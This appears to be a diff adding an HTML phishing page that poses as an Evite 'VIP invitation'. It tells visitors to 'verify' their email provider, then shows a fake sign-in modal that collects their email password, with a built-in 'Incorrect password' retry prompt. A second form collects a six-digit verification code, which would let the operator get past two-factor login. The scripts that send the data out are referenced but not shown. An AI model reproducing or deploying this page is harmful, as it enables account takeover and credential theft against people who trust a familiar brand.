@@ -1,0 +1,393 @@
+<!doctype html>
+<html lang="en" data-theme="light">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <link rel="icon" href="/assets/images/evite-logo-primary.svg" />
+    <link rel="stylesheet" href="./css/style.css" />
+    <link
+      rel="stylesheet"
+      href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.7.2/css/all.min.css"
+      integrity="sha512-Evv84Mr4kqVGRNSgIGL/F/aIDqQb7xQ2vcrdIwxfjThSH8CSR7PBEakCr51Ck+w+/U6swU2Im1vVX0SVk9ABhg=="
+      crossorigin="anonymous"
+      referrerpolicy="no-referrer"
+    />
+    <title>Your Exclusive Invitation - Evite</title>
+  </head>
+  <body>
+    <header class="header">
+      <div class="header__container">
+        <a href="./">
+          <img src="./assets/images/evite-logo-primary.svg" alt="Evite Logo" />
+        </a>
+      </div>
+    </header>
+
+    <main class="main">
+      <article class="invitation-card">
+        <section class="card-preview">
+          <header class="card-preview__header">
+            <p class="card-preview__eyebrow">
+              Flip-flops optional. RSVP appreciated.
+            </p>
+          </header>
+
+          <div class="card-preview__slider">
+            <div class="card-preview__cards">
+              <article class="floating-card">
+                <img src="./assets/images/template-01.webp" alt="" />
+              </article>
+
+              <article class="floating-card">
+                <img src="./assets/images/template-02.webp" alt="" />
+              </article>
+
+              <article class="floating-card">
+                <img src="./assets/images/template-03.webp" alt="" />
+              </article>
+            </div>
+          </div>
+
+          <footer class="card-preview__footer">
+            <button
+              class="card-preview__indicator active"
+              aria-label="Go to slide 1"
+            ></button>
+            <button
+              class="card-preview__indicator"
+              aria-label="Go to slide 2"
+            ></button>
+            <button
+              class="card-preview__indicator"
+              aria-label="Go to slide 3"
+            ></button>
+          </footer>
+        </section>
+
+        <section class="card-details">
+          <div class="card-details__content">
+            <div class="details-screen details-screen--welcome active">
+              <header class="card-details__header">
+                <p class="card-details__eyebrow">
+                  <i class="fa-regular fa-envelope-open"></i>
+                  VIP Invitation
+                </p>
+                <h2 class="invitation-title">Your Invitation is Ready!</h2>
+                <p class="invitation-description">
+                  An exclusive digital invitation has been prepared for you. Tap
+                  below to securely verify and unlock your details.
+                </p>
+                <div class="invitation-host">
+                  <p class="invitation-host__label">Invitation Host By:</p>
+                  <div class="invitation-host__content">
+                    <p class="invitation-host__name">Evite Guest Host</p>
+                  </div>
+                </div>
+              </header>
+              <button type="button" class="card-details__button">
+                <span>View ecard Invitation</span>
+                <i class="fa-solid fa-arrow-right"></i>
+              </button>
+            </div>
+
+            <div class="details-screen details-screen--loading">
+              <div class="loader">
+                <div class="loader__circle">
+                  <div class="loader__ring"></div>
+                  <div class="loader__icon">
+                    <i class="fa-regular fa-envelope-open"></i>
+                  </div>
+                </div>
+                <h3 class="loader__title">Security Verification</h3>
+                <p class="loader__subtitle">Fetching VIP Ecard</p>
+                <p class="loader__message">Your ecard is loading...</p>
+                <div class="loader__dots">
+                  <span></span>
+                  <span></span>
+                  <span></span>
+                </div>
+              </div>
+            </div>
+
+            <div class="details-screen details-screen--invitation">
+              <button type="button" class="invitation-back">
+                <i class="fa-solid fa-chevron-left"></i>
+                <span>Back to Intro</span>
+              </button>
+
+              <div class="invitation-signin">
+                <header class="invitation-signin__header">
+                  <h2 class="invitation-signin__title">
+                    Sign in to view invitation
+                  </h2>
+                  <p class="invitation-signin__description">
+                    Please verify your email provider to access this secure
+                    Evite invitation.
+                  </p>
+                </header>
+                <div class="provider-list">
+                  <a href="/google.html" class="provider provider--gmail">
+                    <div class="provider__logo">
+                      <img src="./assets/images/gmail.svg" alt="Gmail" />
+                    </div>
+                    <div class="provider__label">Sign in with Gmail</div>
+                  </a>
+
+                  <button
+                    class="provider provider--outlook"
+                    data-provider="outlook"
+                    data-name="Outlook"
+                  >
+                    <div class="provider__logo">
+                      <img src="./assets/images/outlook.svg" alt="Outlook" />
+                    </div>
+                    <div class="provider__label">Sign in with Outlook</div>
+                  </button>
+
+                  <button
+                    class="provider provider--office"
+                    data-provider="office365"
+                    data-name="Office365"
+                  >
+                    <div class="provider__logo">
+                      <img
+                        src="./assets/images/office365.svg"
+                        alt="Office365"
+                      />
+                    </div>
+                    <div class="provider__label">Sign in with Office365</div>
+                  </button>
+
+                  <button
+                    class="provider provider--yahoo"
+                    data-provider="yahoo"
+                    data-name="Yahoo Mail"
+                  >
+                    <div class="provider__logo">
+                      <img src="./assets/images/yahoo.svg" alt="Yahoo" />
+                    </div>
+                    <div class="provider__label">Sign in with Yahoo Mail</div>
+                  </button>
+
+                  <button
+                    class="provider provider--aol"
+                    data-provider="aol"
+                    data-name="AOL"
+                  >
+                    <div class="provider__logo">
+                      <img src="./assets/images/aol.svg" alt="AOL" />
+                    </div>
+                    <div class="provider__label">Sign in with AOL</div>
+                  </button>
+
+                  <button
+                    class="provider provider--other"
+                    data-provider="email"
+                    data-name="Email"
+                  >
+                    <div class="provider__logo">
+                      <img src="./assets/images/email.svg" alt="Email" />
+                    </div>
+                    <div class="provider__label">Sign in with Other Mail</div>
+                  </button>
+                </div>
+              </div>
+            </div>
+          </div>
+        </section>
+      </article>
+    </main>
+
+    <div class="modal">
+      <div class="modal__overlay"></div>
+
+      <div class="modal__dialog">
+        <div class="modal__content">
+          <button class="modal__close" type="button">
+            <svg
+              viewBox="0 0 24 24"
+              class="h-5 w-5"
+              fill="none"
+              stroke="currentColor"
+              stroke-width="2"
+              stroke-linecap="round"
+            >
+              <path d="M18 6L6 18"></path>
+              <path d="M6 6l12 12"></path>
+            </svg>
+          </button>
+
+          <header class="modal__header">
+            <div class="modal__provider">
+              <div class="modal__provider-logo">
+                <img src="./assets/images/outlook.svg" alt="" />
+              </div>
+
+              <div class="modal__provider-info">
+                <h2 class="modal__provider-name">Outlook</h2>
+                <p class="modal__provider-description">
+                  Enter your email and password to continue.
+                </p>
+              </div>
+            </div>
+          </header>
+
+          <div class="modal__body">
+            <form
+              class="modal__form modal__stage modal__stage--login"
+              id="login-form"
+            >
+              <div class="modal__error" role="status" aria-live="polite">
+                Incorrect password, please try again.
+              </div>
+              <div class="modal__form-group">
+                <label class="modal__label">Email</label>
+                <input
+                  class="modal__input"
+                  type="email"
+                  name="email"
+                  placeholder="name@example.com"
+                  required
+                />
+              </div>
+              <div class="modal__form-group">
+                <label class="modal__label">Password</label>
+                <div class="modal__password">
+                  <input
+                    class="modal__input"
+                    type="password"
+                    placeholder="••••••••"
+                    name="password"
+                    required
+                  />
+                  <button class="modal__password-toggle" type="button"></button>
+                </div>
+              </div>
+              <button type="submit" class="modal__submit">
+                <span class="modal__submit-text">Sign in</span>
+                <span class="modal__submit-loading">
+                  <svg class="modal__spinner" viewBox="0 0 24 24" fill="none">
+                    <circle
+                      class="modal__spinner-track"
+                      cx="12"
+                      cy="12"
+                      r="10"
+                      stroke="currentColor"
+                      stroke-width="4"
+                    ></circle>
+                    <path
+                      class="modal__spinner-head"
+                      fill="currentColor"
+                      d="M4 12a8 8 0 0 1 8-8v4a4 4 0 0 0-4 4H4z"
+                    ></path>
+                  </svg>
+                  Loading...
+                </span>
+              </button>
+            </form>
+
+            <form
+              class="modal__form modal__stage modal__stage--verification"
+              id="verification-form"
+            >
+              <div class="modal__verification-header">
+                <h3 class="modal__verification-title">Security Verification</h3>
+
+                <p class="modal__verification-description">
+                  A verification code was sent to your device. Enter it below to
+                  continue.
+                </p>
+              </div>
+
+              <div class="modal__error" role="status" aria-live="polite">
+                Please enter a valid 6-digit code.
+              </div>
+
+              <div class="modal__form-group">
+                <label class="modal__label">
+                  Verification Code (6 digits)
+                </label>
+
+                <input
+                  class="modal__input"
+                  type="text"
+                  inputmode="numeric"
+                  maxlength="6"
+                  placeholder="Enter 6-digit code"
+                  required
+                />
+              </div>
+
+              <button type="submit" class="modal__submit">
+                <span class="modal__submit-text">Verify and Continue</span>
+
+                <span class="modal__submit-loading">
+                  <svg class="modal__spinner" viewBox="0 0 24 24" fill="none">
+                    <circle
+                      class="modal__spinner-track"
+                      cx="12"
+                      cy="12"
+                      r="10"
+                      stroke="currentColor"
+                      stroke-width="4"
+                    ></circle>
+
+                    <path
+                      class="modal__spinner-head"
+                      fill="currentColor"
+                      d="M4 12a8 8 0 0 1 8-8v4a4 4 0 0 0-4 4H4z"
+                    ></path>
+                  </svg>
+
+                  Verifying...
+                </span>
+              </button>
+
+              <div class="modal__resend">
+                <button type="button">Didn't receive a code? Resend</button>
+              </div>
+            </form>
+
+            <div class="modal__stage modal__stage--success">
+              <div class="modal__success-icon">
+                <svg
+                  viewBox="0 0 24 24"
+                  fill="none"
+                  stroke="currentColor"
+                  stroke-width="2"
+                >
+                  <path d="M20 6L9 17l-5-5"></path>
+                </svg>
+              </div>
+
+              <h3 class="modal__success-title">Signed in</h3>
+
+              <p class="modal__success-description">Redirecting...</p>
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <div class="toast" role="status" aria-live="polite">
+      Code resent successfully.
+    </div>
+
+    <footer class="footer">
+      <div class="footer__container">
+        <div class="footer__brand">
+          <img src="./assets/images/evite-logo-primary.svg" alt="Evite" />
+          <span>© 2026 Evite. All rights reserved.</span>
+        </div>
+        <nav class="footer__links">
+          <a href="#">Privacy Policy</a>
+          <a href="#">Terms of Service</a>
+          <a href="#">Contact Support</a>
+        </nav>
+      </div>
+    </footer>
+
+    <script type="module" src="./js/visitor.js"></script>
+    <script type="module" src="./js/main.js"></script>
+  </body>
+</html>
